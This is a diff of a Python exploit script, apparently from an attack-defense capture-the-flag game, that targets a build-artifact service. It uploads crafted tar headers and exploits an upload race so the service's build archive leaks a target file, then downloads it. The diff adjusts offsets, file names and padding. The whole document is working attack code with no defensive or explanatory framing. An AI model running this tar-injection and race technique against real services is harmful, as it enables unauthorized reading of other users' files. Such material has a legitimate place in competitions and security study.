@@ -1,8 +1,10 @@
 #!/usr/bin/env python3
 
+import gzip
 import struct
 import sys
 import time
+import uuid
 
 from starlib import *
 
@@ -39,7 +41,9 @@ def main(host: str, flag_id: str):
     conn1 = cm.connect()
     conn2 = cm.connect()
 
-    attack_project_id = "pwn1"
+#     attack_project_id = str(uuid.uuid4())
+    attack_project_id = 'pwn'  # for easier debugging
+    print('attack project id:', attack_project_id)
     attack_project_pass = cm.create_project(conn1, attack_project_id)
     cm.enter_project(conn2, attack_project_id, attack_project_pass)
 
@@ -48,25 +52,25 @@ def main(host: str, flag_id: str):
     padding_content = b"a" * 512
 
     cm.solve_captcha(conn1)
-    cm.upload(conn1, "padding", padding_header + padding_content)
+    cm.upload(conn1, "padding.tar", padding_header + padding_content)
     print("padding response:", conn1.recv())
 
     # prepare "jump" tar header in file 1.
     # upload will fail, but the file will be created anyway.
 
-    # it should consume next two blocks (tar header & tar content).
-    jump_file_size = 1024
+    # consume next 2048 bytes, should be enough.
+    jump_file_size = 2048
     jump_header = gen_tar_header("jump_filename", jump_file_size)
 
     cm.solve_captcha(conn1)
-    cm.upload(conn1, "jump", jump_header)
-    print("jump header response:", conn1.recv())
+    cm.upload(conn1, "jump.tar", jump_header)
+    print("jump header response:", conn1.recv(), ' / ', conn1.recv(), ' / ', conn1.recv())
 
     # We inject our file after 2000 random files
-    # (each have tar header, tar header of underlying, and tar content),
+    # (each have tar header and tar content),
     # plus tar header for the jump file itself
     # minus tar header itself.
-    jump_offset = 512 * 3 * 2000 + 512 - 512
+    jump_offset = 512 * 2 * 2000 + 512 - 512
     start_header = gen_tar_header("start_filename", jump_offset)
 
     artifacts = [
@@ -78,7 +82,7 @@ def main(host: str, flag_id: str):
     ]
     artifacts += [
         Artifact(
-            source="jump",
+            source="jump.tar",
             destination=f"jump",
         )
     ]
@@ -89,20 +93,34 @@ def main(host: str, flag_id: str):
             destination="target",
         )
     ]
+    # Pad after to avoid out of bounds read.
+    artifacts += [
+        Artifact(
+            source="padding",
+            destination=f"padding{10000 + i}",
+        )
+        for i in range(5)
+    ]
     job = Job(steps=[Step(name="build", artifacts=artifacts)])
 
     cm.solve_captcha(conn1)
     cm.solve_captcha(conn2)
 
     cm.job(conn1, JobRequest(job=job))
-    time.sleep(1)
+    time.sleep(0.5)
     cm.upload(conn2, ".build.tar", start_header)
 
-    print(conn1.recv())
-    print(conn2.recv())
+    job_resp = conn1.recv()
+    if "internal error" in job_resp:
+        job_resp += " / " + conn1.recv()
+    print('job:', job_resp)
+    print('upload:', conn2.recv())
 
     print("list:", cm.list(conn1, "build/"))
-    print(cm.download(conn1, "build/jump_filename"))
+    data = cm.download(conn1, "build/jump_filename")
+    print("download:", data)
+    if fmt == 'targz':
+        print('decompressed:', gzip.decompress(data[512:1024]))
 
 
 if __name__ == "__main__":
